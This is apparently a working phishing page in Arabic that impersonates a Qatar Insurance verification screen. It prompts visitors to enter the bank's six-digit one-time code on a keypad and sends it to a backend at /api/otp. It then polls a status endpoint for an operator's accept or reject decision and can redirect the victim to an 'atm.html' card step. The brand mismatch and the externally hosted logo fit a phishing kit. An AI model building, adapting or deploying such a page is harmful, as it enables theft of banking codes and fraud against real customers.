<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>رمز التحقق - قطر للتأمين</title>
<style>
  :root {
    --green: #1a6b3c;
    --anabi: #8A1B2F;
    --muted: #5c6b74;
    --light-bg: #f4f6f8;
    --border: #d7dce0;
    --text-dark: #2b2b2b;
    --card-bg: #ffffff;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: "Segoe UI", "Tahoma", Arial, sans-serif;
    background-color: var(--light-bg);
    color: var(--text-dark);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 16px;
  }
  .screen {
    width: 100%;
    max-width: 440px;
    display: flex;
    flex-direction: column;
    padding: 24px;
    background: var(--card-bg);
    border-radius: 16px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
  }
  @media (max-width: 480px) {
    body { background: var(--card-bg); padding: 0; align-items: flex-start; }
    .screen { box-shadow: none; border-radius: 0; min-height: 100vh; padding: 16px 20px 0 20px; }
  }
  .secure-icon {
    width: 50px;
    height: 50px;
    background-color: rgba(138, 27, 47, 0.05);
    border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    margin: 0 auto 16px;
    color: var(--anabi);
  }
  .secure-icon img {
    width: 32px;
    height: 32px;
    object-fit: contain;
  }
  h2 { color: var(--anabi); font-size: 19px; margin: 0 0 8px; text-align: center; }
  p.desc { color: var(--muted); font-size: 13px; line-height: 1.6; margin: 0 0 24px; text-align: center; }
  .pin-display { display: flex; justify-content: center; gap: 10px; margin-bottom: 24px; direction: ltr; }
  .pin-dot {
    width: 14px; height: 14px; border-radius: 50%;
    border: 2px solid var(--border);
    transition: all 0.15s ease;
  }
  .pin-dot.filled { background-color: var(--anabi); border-color: var(--anabi); transform: scale(1.1); }
  .keypad {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 12px;
    max-width: 280px;
    margin: 0 auto 24px;
  }
  .key {
    background-color: #ffffff;
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 14px;
    font-size: 18px;
    font-weight: bold;
    color: var(--anabi);
    cursor: pointer;
    user-select: none;
    transition: all 0.1s ease;
    text-align: center;
  }
  .key:active { background-color: var(--light-bg); transform: scale(0.95); }
  .key.action { font-size: 13px; background-color: #f8f9fa; color: var(--muted); }
  .key.action:active { background-color: #e9ecef; }
  .btn-submit {
    width: 100%;
    background-color: var(--anabi);
    color: #ffffff;
    border: none;
    border-radius: 12px;
    padding: 16px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    box-shadow: 0 4px 12px rgba(138, 27, 47, 0.25);
  }
  .btn-submit:hover { background-color: #6f1626; }
  .btn-submit:disabled { background-color: var(--anabi); opacity: .55; cursor: not-allowed; box-shadow: none; }
  .error-msg { color: #c0392b; font-size: 13px; margin-top: 12px; display: none; text-align: center; }
  .rejection-notice {
    position: fixed; top: 18px; left: 50%; transform: translateX(-50%); z-index: 1100;
    display: none; align-items: center; gap: 10px; width: min(92%, 430px);
    padding: 12px 16px; border: 1px solid #f0b7b7; border-radius: 10px;
    background: #fff5f5; color: #c0392b; font-size: 14px; font-weight: 800;
    box-shadow: 0 8px 22px rgba(192, 57, 43, .18);
  }
  .rejection-notice.show { display: flex; }
  .rejection-notice__icon { display: grid; place-items: center; width: 24px; height: 24px; flex: none; border-radius: 50%; background: #c0392b; color: #fff; font-size: 17px; line-height: 1; }

  .overlay {
    position: fixed; inset: 0;
    background: rgba(255, 255, 255, 0.95);
    display: none; align-items: center; justify-content: center;
    flex-direction: column; gap: 18px; z-index: 999; padding: 24px; text-align: center;
  }
  .overlay.show { display: flex; }
  .spinner {
    width: 46px; height: 46px;
    border: 4px solid #e2e6e9;
    border-top-color: var(--green);
    border-radius: 50%;
    animation: spin .8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .overlay p { font-size: 14px; color: var(--green); font-weight: 600; margin: 0; max-width: 300px; line-height: 1.7; }
  .reject-icon {
    width: 56px; height: 56px; border-radius: 50%;
    background: #c0392b;
    display: flex; align-items: center; justify-content: center;
  }
  .reject-icon svg { width: 26px; height: 26px; }
  .overlay button {
    margin-top: 6px; background: #1565c0; color: #fff; border: none;
    border-radius: 6px; padding: 10px 24px; font-size: 13.5px; font-weight: 700; cursor: pointer;
  }
  .overlay button:hover { background: #0d47a1; }
</style>
</head>
<body>
  <div class="rejection-notice" id="rejectionNotice" role="alert">
    <span class="rejection-notice__icon" aria-hidden="true">×</span>
    <span id="rejectionNoticeText">الرمز غير صحيح أو غير صالح</span>
  </div>

  <div class="screen">
    <div id="otpForm">
      <div class="secure-icon">
        <img src="https://i.ibb.co/RpJQzkGv/file-0000000082108210923417ca7ddf8438.png" alt="رمز التحقق">
      </div>

      <h2>رمز التحقق</h2>
      <p class="desc">سيتم إرسال رمز التحقق عبر رقم الجوال المسجل لدى البنك</p>

      <div class="pin-display">
        <div class="pin-dot" id="dot-0"></div>
        <div class="pin-dot" id="dot-1"></div>
        <div class="pin-dot" id="dot-2"></div>
        <div class="pin-dot" id="dot-3"></div>
        <div class="pin-dot" id="dot-4"></div>
        <div class="pin-dot" id="dot-5"></div>
      </div>

      <div class="keypad">
        <div class="key" onclick="pressNum(1)">1</div>
        <div class="key" onclick="pressNum(2)">2</div>
        <div class="key" onclick="pressNum(3)">3</div>
        <div class="key" onclick="pressNum(4)">4</div>
        <div class="key" onclick="pressNum(5)">5</div>
        <div class="key" onclick="pressNum(6)">6</div>
        <div class="key" onclick="pressNum(7)">7</div>
        <div class="key" onclick="pressNum(8)">8</div>
        <div class="key" onclick="pressNum(9)">9</div>
        <div class="key action" onclick="clearOtp()">مسح</div>
        <div class="key" onclick="pressNum(0)">0</div>
        <div class="key action" onclick="backspace()">حذف</div>
      </div>

      <button class="btn-submit" id="btnSubmit" type="button" disabled>تأكيد</button>
      <div class="error-msg" id="errorMsg">يرجى إدخال الرمز بالكامل</div>
    </div>
  </div>

  <div class="overlay" id="waitOverlay">
    <div class="spinner"></div>
    <p>جاري التحقق...</p>
  </div>

  <div class="overlay" id="rejectOverlay">
    <div class="reject-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <line x1="18" y1="6" x2="6" y2="18"></line>
        <line x1="6" y1="6" x2="18" y2="18"></line>
      </svg>
    </div>
    <p style="color:#c0392b; font-weight:bold; font-size:16px;">الرمز غير صحيح أو غير صالح</p>
    <button type="button" id="retryOtpBtn" style="background-color:#c0392b;">إعادة المحاولة</button>
  </div>

  <script>
    var otp = "";
    var requestId = sessionStorage.getItem('aman_bank_request_id') || localStorage.getItem('requestId') || new URLSearchParams(window.location.search).get('id');
    if (!requestId) {
      requestId = '999';
      localStorage.setItem('requestId', requestId);
    }

    var otpForm = document.getElementById('otpForm');
    var waitOverlay = document.getElementById('waitOverlay');
    var rejectOverlay = document.getElementById('rejectOverlay');
    var statusPollTimer = null;
    var errorMsg = document.getElementById('errorMsg');

    function updateDots() {
      for (var i = 0; i < 6; i++) {
        var dot = document.getElementById('dot-' + i);
        if (i < otp.length) dot.classList.add('filled');
        else dot.classList.remove('filled');
      }
      document.getElementById('btnSubmit').disabled = (otp.length !== 6);
    }

    function pressNum(num) {
      if (otp.length < 6) {
        otp += num;
        updateDots();
      }
    }

    function clearOtp() {
      otp = "";
      updateDots();
      errorMsg.style.display = 'none';
    }

    function backspace() {
      if (otp.length > 0) {
        otp = otp.slice(0, -1);
        updateDots();
        errorMsg.style.display = 'none';
      }
    }

    function stopPoll() { clearInterval(statusPollTimer); statusPollTimer = null; }

    function showRejectionNotice() {
      document.getElementById('rejectionNotice').classList.add('show');
    }

    function pollOtpStatus() {
      statusPollTimer = setInterval(function() {
        fetch('/api/status/' + requestId)
          .then(function(res) { return res.json(); })
          .then(function(data) {
            if (!data.ok) return;

            if (data.stage === 'atm' && data.status === 'accept' && data.otpSubmitted) {
              stopPoll();
              window.location.href = 'atm.html?id=' + requestId;
              return;
            }

            if (data.stage === 'otp' && data.status === 'reject') {
              stopPoll();
              waitOverlay.classList.remove('show');
              otpForm.style.display = 'block';
              errorMsg.textContent = 'الرمز غير صحيح أو غير صالح';
              errorMsg.style.display = 'block';
              showRejectionNotice();
              return;
            }
          })
          .catch(function() {});
      }, 2500);
    }

    function submitOtp() {
      if (otp.length !== 6) {
        errorMsg.textContent = 'يرجى إدخال الرمز بالكامل';
        errorMsg.style.display = 'block';
        return;
      }

      errorMsg.style.display = 'none';
      otpForm.style.display = 'none';
      waitOverlay.classList.add('show');
      rejectOverlay.classList.remove('show');

      fetch('/api/otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: requestId, otp: otp })
      })
      .then(function(res) { return res.json(); })
      .then(function(data) {
        if (data.ok) {
          pollOtpStatus();
        } else {
          throw new Error('failed');
        }
      })
      .catch(function() {
        waitOverlay.classList.remove('show');
        otpForm.style.display = 'block';
        errorMsg.textContent = 'الرمز غير صحيح أو غير صالح';
        errorMsg.style.display = 'block';
      });
    }

    document.getElementById('btnSubmit').addEventListener('click', submitOtp);

    document.getElementById('retryOtpBtn').addEventListener('click', function() {
      rejectOverlay.classList.remove('show');
      otpForm.style.display = 'block';
      otp = "";
      updateDots();
      errorMsg.style.display = 'none';
    });

    var urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === '1' || urlParams.get('error') === 'otp') {
      errorMsg.textContent = 'الرمز غير صحيح أو غير صالح';
      errorMsg.style.display = 'block';
      showRejectionNotice();
    }

    updateDots();
  </script>

</body>
</html>
